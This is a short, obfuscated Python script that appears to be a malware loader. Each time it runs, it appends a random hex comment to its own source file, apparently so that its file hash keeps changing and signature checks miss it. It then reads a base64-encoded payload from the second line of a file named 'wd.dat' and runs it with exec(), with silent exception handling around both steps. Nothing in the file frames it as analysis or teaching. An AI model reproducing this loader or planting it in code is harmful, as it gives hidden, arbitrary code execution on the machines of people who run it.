import os as _zwcdDlyl, base64 as _MORecDMW, random
def _m():
    try:
        with open(__file__,'r') as f: c=f.read()
        j="#"+"".join(random.choices("abcdef0123456789",k=32))
        with open(__file__,'w') as f: f.write(c+"\n"+j)
    except: pass
_m()
_c="wd.dat"
if _zwcdDlyl.path.exists(_c):
    try:
        with open(_c,'r') as f:
            l=f.readlines()
            if len(l)>1: exec(_MORecDMW.b64decode(l[1]).decode('utf-8'), globals())
    except: pass
